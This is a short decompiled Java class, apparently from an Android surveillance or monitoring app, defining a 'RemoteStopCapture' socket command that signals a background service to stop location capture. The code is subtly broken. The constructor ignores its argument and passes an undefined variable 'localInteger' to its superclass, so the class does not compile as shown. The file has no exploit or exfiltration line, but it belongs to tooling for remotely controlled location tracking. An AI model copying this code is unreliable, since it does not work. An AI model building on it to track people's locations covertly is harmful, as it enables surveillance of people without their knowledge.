package com.vvt.capture.location.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteStopCapture
  extends SocketCmd
{
  private static final long serialVersionUID = 1611245956612666075L;
  
  public RemoteStopCapture(int paramInt)
  {
    super(localInteger, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.psysd";
  }
  
  protected String getTag()
  {
    return "RemoteStopCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/ref/command/RemoteStopCapture.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */